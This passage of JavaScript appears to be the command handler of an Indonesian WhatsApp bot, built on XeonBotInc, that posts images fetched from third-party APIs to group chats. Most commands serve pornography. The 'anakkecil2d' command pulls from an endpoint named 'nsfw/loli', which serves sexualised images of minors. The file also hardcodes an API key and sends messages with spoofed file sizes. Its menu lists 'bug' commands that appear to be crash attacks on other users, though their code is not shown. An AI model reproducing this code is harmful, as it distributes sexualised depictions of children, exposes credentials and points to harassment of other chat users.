XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Milf Saikouu!!!"}, {quoted:m})
break
		case 'anakkecil2d':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Tiati bang"}, {quoted:m})
break
	
		case 'liwed':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/lewdanimegirls?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Colilah meskipun titit anda sudah loyo_!"}, {quoted:m})
break
	
		case 'lycoris':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=lycoris_recoil`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Dapet ambatukam = GAY!"}, {quoted:m})
break
		case 'spyxfamily':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=spy_x_family`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
break
		
		case 'nun':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
   		if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=nun`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
break
		case 'femdom':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    		if (isBanChat) return reply(mess.bangc)
		if (!m.isGroup) return replay(mess.grouponly)
		if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/hentaifemdom?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
break
		
		case 'crot':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/cum?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
break
		
	case 'abc':
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/yuri?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
break	
	case 'tete':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/tits?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'memec':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/pussy?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'yurimesum':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/eroyuri?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'holoero':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/holoero?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'nekochan':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break		
		
	case 'koelananglohmas':
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/trap?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Terdiam melihat kelakuanmu_ "}, {quoted:m})
break	
		
		case 'slurp':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/blowjob?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Sepong tros tuh batang_ "}, {quoted:m})
break
		case 'fetishkaki':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/feet?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
break
	
		case 'pantat2d':
	    if (!isMod) return reply(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/animebooty?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
break	



		case 'nenengede':
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"_Sugoi Dekkai_ "}, {quoted:m})
break
case 'glasses':  case 'mstrb':  case'tentacles':{
    if (!m.isGroup) return replay (mess.grouponly)
    if (isBan) return reply(mess.banned)
    if (!AntiNsfw) return reply(mess.nonsfw)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.xteam.xyz/randomimage/${command}?APIKEY=70fbbb7a90d2a51a`
let button =[
{buttonId: `-dongnasi`, buttonText: {displayText: `Sedekah Seikhlasnya!`}, type: 1},
]
let buttonMessage ={
image :{url:nye},
caption :`Anuu...`,
footer : `Miuna Bot`,
headerType : 4,
}
await sleep(15000)
XeonBotInc.sendMessage(from, buttonMessage,{quoted:m})
}
break
	case 'meme' :{
	reply (mess.waiting)
	tot = `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`
	let button =[
{buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
]
let buttonMessage ={
image :{url:tot},
caption :`AwikWok banged 😶`,
footer : `ᴍɪᴜɴᴀ`,
headerType : 4,
}
await sleep(15000)
XeonBotInc.sendMessage(m.chat, buttonMessage,{quoted : fdocs })
	}
	break
	case 'pat' : case 'Patrick':
case 'patricksticker': {
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break	
			
					
case 'hentai-neko' :
case 'hneko' :
    if (isBan) return reply(mess.banned)	 	
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Miow-Miow Nii-chan...`,
  buttons: hnekobot,
  headerType: 1
  }  
  await sleep(15000)    
            await XeonBotInc.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break

case 'hentai-waifu' :
case 'hwaifu' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: nwaifubot,
  headerType: 1
  } 
  await sleep(15000)     
            await XeonBotInc.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break


case 'foxgirl':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)
                           var wbuttsss = [
        {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
        ]
      let button12ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Awooo...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   

case 'crossplay': case 'crosplay': 
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
                const buttons = [
        {buttonId: '-dongnasi', buttonText: {displayText: 'Bantu Bot Agar Tetap Hidup!'}, type: 1},
            ]               
        const cosplybutton = {
        image: {url: 'https://hanzz-web.herokuapp.com/api/randomimage/cosplay'},
        caption: "Guess who am i...",
        footer: `${global.BotName}`,
        buttons: buttons,
        headerType: 4
        }
                  
        await XeonBotInc.sendMessage(m.chat,cosplybutton, { quoted:m }).catch(err => {
            return('Error!')
        })  

        break


case 'feed':
case 'meow':
case 'tickle':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
        ]
      let buttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here it is...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

case 'cry':  case 'handhold':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} ${command}ed with themself!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} ${command}ed with @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break

case 'nom':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} is eating with themself!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} is eating with @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break

case 'hug':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} hugged themself!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break



case 'kill': case 'pats': case 'lick': case 'kiss': case 'bite':
case 'bully': case 'bonk': case 'poke': case 'slap':
case 'happy':
case 'cuddle': case 'tendang':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} ${command}ed themselves!!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} ${command}ed  @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		XeonBotInc.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break

case 'megumin':
if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
ud = await axios.get('https://waifu.pics/api/sfw/megumin')
var wbutsss = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `Donet`}, type: 1},
         ]
      let buttonzMessage = {
      image: {url:ud.data.url},
       caption:  `Exoplusionnnn...`,
      footer: `${global.BotName}`,
          buttons: wbutsss,
     headerType: 4
                      }
await XeonBotInc.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break     

case 'awoo':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    reply(mess.waiting)						
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)
 var wbuttsss = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `ʙᴀɴᴛᴜ ᴀᴅᴍɪɴ ᴍᴇɴʏᴀᴍʙᴜɴɢ ʜɪᴅᴜᴘ!`}, type: 1},
    ]
  let button1Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here it is...`,
   footer: `${global.BotName}`,
  buttons: wbuttsss,
  headerType: 2
  }       
            await XeonBotInc.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break


case 'anime':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
	    if(!q) return reply(`Tolong ketik judul animenya!\n\n*Contoh:* ${prefix}anime naruto`)
reply(mess.waiting)							
const { Anime } =require("@shineiichijo/marika")
    const client = new Anime();
     let anime = await client.searchAnime(q)
    let result = anime.data[0];
    console.log(result)
   let details = `*Judul :* ${result.title}\n`;
    details += `*Tipe:* ${result.type}\n`;
    details += `*Status:* ${result.status.toUpperCase().replace(/\_/g, " ")}\n`;
    details += `*Total episode:* ${result.episodes}\n`;
    details += `*Durasi:* ${result.duration}\n`;
    details += `*Genre:*\n`;
    for (let i = 0; i < result.genres.length; i++) {
      details += `\t\t\t\t\t\t\t\t${result.genres[i].name}\n`;
    }
    details += `*Berdasarkan:* ${result.source.toUpperCase()}\n`;
    details += `*Studio:*\n`;
    for (let i = 0; i < result.studios.length; i++) {
      details += `\t\t\t\t\t\t\t\t${result.studios[i].name}\n`;
    }
    details += `*Producer:*\n`;
    for (let i = 0; i < result.producers.length; i++) {
      details += `\t\t\t\t\t\t\t\t\t\t${result.producers[i].name}\n`;
    }
    details += `*Tayang perdana:* ${result.aired.from}\n`;
    details += `*Berakhir pada:* ${result.aired.to}\n`;
    details += `*Popularitas:* ${result.popularity}\n`;
    details += `*Favorite:* ${result.favorites}\n`;
    details += `*Rating:* ${result.rating}\n`;
    details += `*Peringkat:* ${result.rank}\n\n`;
    if (result.trailer.url !== null)
      details += `*Trailer:* ${result.trailer.url}\n\n`;
    details += `*URL:* ${result.url}\n\n`;
    if (result.background !== null)
      details += `*Background:* ${result.background}\n\n`;
    details += `*Deskripsi:* ${result.synopsis.replace(
      /\[Written by MAL Rewrite]/g,
      ""
    )}`
XeonBotInc.sendMessage(m.chat,{image:{url:result.images.jpg.large_image_url},caption:details},{quoted:m})   
break

case 'manga':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
const { Manga } =require("@shineiichijo/marika")
const manga = new Manga();
if(!q) return reply(`Tolong masukkan judulnya!\n\n_Contoh:_ ${prefix}manga naruto`)
let srh = await manga.searchManga(q)
    let mang = `*Judul:* ${srh.data[0].title}\n`;
    mang += `*Status:* ${srh.data[0].status}\n`;
    mang += `*Total Volume:* ${srh.data[0].volumes}\n`;
    mang += `*Total Chapter:* ${srh.data[0].chapters}\n`;
    mang += `*Genre:*\n`;
    for (let i = 0; i < srh.data[0].genres.length; i++) {
      mang += `\t\t\t\t\t\t\t\t${srh.data[0].genres[i].name}\n`;
    }
    mang += `*Diterbitkan pada:* ${srh.data[0].published.from}\n`;
    mang += `*Skor:* ${srh.data[0].scored}\n`;
    mang += `*Popularitas:* ${srh.data[0].popularity}\n`;
    mang += `*Favorite:* ${srh.data[0].favorites}\n`;
    mang += `*Authors:*\n`;
    for (let i = 0; i < srh.data[0].authors.length; i++) {
      mang += `\t\t\t\t\t\t\t\t\t${srh.data[0].authors[i].name} (${srh.data[0].authors[0].type})\n`;
    }
    mang += `\n*URL:* ${srh.data[0].url}\n\n`;
    if (srh.data[0].background !== null)
      mang += `*Background:* ${srh.data[0].background}`;
    mang += `*Deskripsin:* ${srh.data[0].synopsis.replace(
      /\[Written by MAL Rewrite]/g,
      ""
    )}`;
XeonBotInc.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})   
break





case 'neko' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)	
    waifuddd = await axios.get('https://waifu.pics/api/sfw/neko')
 var wbuttsssr = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
    ]
        let buttonMessagessf = {
        image: {url:waifuddd.data.url},
        caption: 'Miow Miow...',
        buttons: wbuttsssr,
        headerType: 2
         }     
                                  
    await XeonBotInc.sendMessage(m.chat, buttonMessagessf, { quoted:m }).catch(err => {
        return('error..')
        })
break





case "quotes":
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
var res = await Quotes()
teks = `\n*Author:* ${res.author}\n`
teks += `\n*Quotes:*\n`
teks += `${res.quotes}\n`

replay(teks)
break

case "darkjoke":
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
var res = await Darkjokes()
teks = "\n🤭"
XeonBotInc.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
break

case 'code404': case 'keluar': case 'keluargrup': case 'bye': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
        reply('Wakatta nii-sama!')
if (!isCreator) return replay(`${mess.botowner}`)
await XeonBotInc.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
                break


case 'bc': case 'broadcast': case 'bcall': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
if (!isCreator) return replay(mess.botowner)
if (!args.join(" ")) return replay(`Please enter some text to broadcast! \n\nExample : ${prefix + command} ${global.OwnerName}`)
let anu = await store.chats.all().map(v => v.id)
replay(`Send Broadcast To ${anu.length} Chat\nTime's up ${anu.length * 1.5} second`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
quickReplyButton: {
displayText: '✨Menu✨',
id: '-menu'
}  
}, {
quickReplyButton: {
displayText: 'Ri',
id: '-owner'
}
}]
let txt = `「 *${global.OwnerName}'s Broadcast* 」\n\n${text}`
XeonBotInc.send5ButImg(yoi, txt, `${global.BotName}`, BotLogo, btn, Thumb)
}
replay('Broadcast Sent !')
}
break    
case 'deleteall': case 'delall': case 'delete': case 'del': {
    if (isBan) return reply(mess.banned)		
 if (isBanChat) return reply(mess.bangc)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!m.quoted) return reply('Balas Pesannya atuh!')
 let { chat, fromMe, id} = m.quoted

const key = {
    remoteJid: m.chat,
    fromMe: false,
    id: m.quoted.id,
    participant: m.quoted.sender
}

await XeonBotInc.sendMessage(m.chat, { delete: key })
 }
 break
 
case 'masukin': case 'code500': case 'tambahin':{     			
    if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 if (users.length == 0) return replay(`Tolong ketik nomor orang yang ingin ditambahkan`)
  await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replay(`Orang tersebut telah ditambahkan!`)).catch((err) => replay(`Gabisa nambahin orang tersebut ke group ini!`))
 }
 break


 case "tts":  case "texttospeech":  case "say": case "speak":{
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)

    if (!args[0]) return reply("Tolong beri aku textnya biar aku bisa ngomong!")
      
      let texttosay = text
        ? text
        : m.quoted && m.quoted.text
        ? m.quoted.text
        : m.text;
      const SpeakEngine = require("google-tts-api"); 
      const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, {lang: "en", slow: false, host: "https://translate.google.com",});
      XeonBotInc.sendMessage(m.chat,{audio: {url: texttospeechurl,},mimetype: "audio/mpeg",fileName: `XeonBotIncSpeechEngine.mp3`,},{quoted: m,});
    }
    break;


	case 'changelog': case 'cl': case 'clog':{
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
      
 const clog = `
╭────❲ ᴄʜᴀɴɢᴇʟᴏɢ ❳
│
│> ᴜᴘᴅᴀᴛᴇ ᴛᴇʀᴀᴋʜɪʀ
│
│✑ ${prefix}ᴏᴛᴀᴋᴜᴅᴇsᴜ (ғɪxᴇᴅ)
│✑ ${prefix}ᴅᴅʟᴀᴛᴇsᴛ [ᴅᴏᴜᴊɪɴ ᴅᴇsᴜ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪsᴇᴀʀᴄʜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪᴘᴅғ [ᴋᴏᴅᴇ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪ (ᴛᴀᴍᴘɪʟᴀɴ ʙᴀʀᴜ)
│✑ ${prefix}ʟᴇᴡᴅ (ᴜᴘᴅᴀᴛᴇᴅ)
│
│>>『  ᴍɪᴜɴᴀ  』<<
│
╰─────────────────⊱
`
 let buttonsclogm = [
    {buttonId: `-dongnasi`, buttonText: {displayText: 'ᴊᴀᴅɪ ᴅᴏɴᴀᴛᴜʀ!'}, type: 1}
    ]
let buttonMessage = {
document:fs.readFileSync('./Rimed/Ri.xlsx'),
mimetype : docs, 
fileName : 'ᴄʜᴀɴɢᴇʟᴏɢ',
fileLength: 99999999999999,
pageCount : 69696969,
caption: clog,
footer: `ᴍɪᴜɴᴀ`,
buttons: buttonsclogm,
headerType: 4
}
XeonBotInc.sendMessage(m.chat, buttonMessage,{ quoted:m })
}
break	
	


case 'help': case 'h': case 'helo': case 'menu': case 'allmenu': case 'listmenu':{ 
if(isBan) return reply (`turu`)
const text =  `
╭─❲ ❀ ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ ❀ ❳
│
│彡 Hai ᴋᴀᴋ *${pushname}.* 彡
│
│✑ɴᴀᴍᴀ ʙᴏᴛ : ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ
│✑sᴘᴇᴇᴅ  : ${latensie.toFixed(4)} ᴍɪʟɪᴅᴇᴛɪᴋ
│✑ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
│✑ɴᴏ. ᴏᴡɴᴇʀ : 𝟶𝟾𝟻𝟷𝟼𝟷𝟾𝟾𝟾𝟿𝟽𝟹
│✑ɴᴀᴍᴀ ᴏᴡɴᴇʀ : ᴍ. ʀɪ
│✑ɴᴏᴛᴇ : ᴊɪᴋᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ
│ʙᴜɢ ʜᴀʀᴀᴘ ʟᴀᴘᴏʀ ᴅᴇɴɢᴀɴ 
│ᴄᴀʀᴀ -ʀᴇᴘᴏʀᴛ
│   
│✑✑✑❀ ᴅᴏɴᴀᴛᴜʀ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴀɴɪᴍᴇᴏɴɢᴏɪɴɢ
│✑ ${prefix}ᴀsᴜᴘᴀɴ [ɴᴀᴍᴀ ᴄʜᴀʀᴀ]
│✑ ${prefix}ʙᴜɢɢᴄ [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟷 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟸 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟹 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ɢᴏᴏɢʟᴇᴅʀɪᴠᴇ [ʟɪɴᴋ]
│✑ ${prefix}ʜᴇɴᴛᴀɪᴍᴇɴᴜᴠ𝟸
│✑ ${prefix}ᴋᴜsᴏɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ɴᴇᴋᴏᴘᴏɪ [ᴜᴘᴅᴀᴛᴇ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪ [ᴋᴏᴅᴇ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪᴘᴅғ [ᴋᴏᴅᴇ]
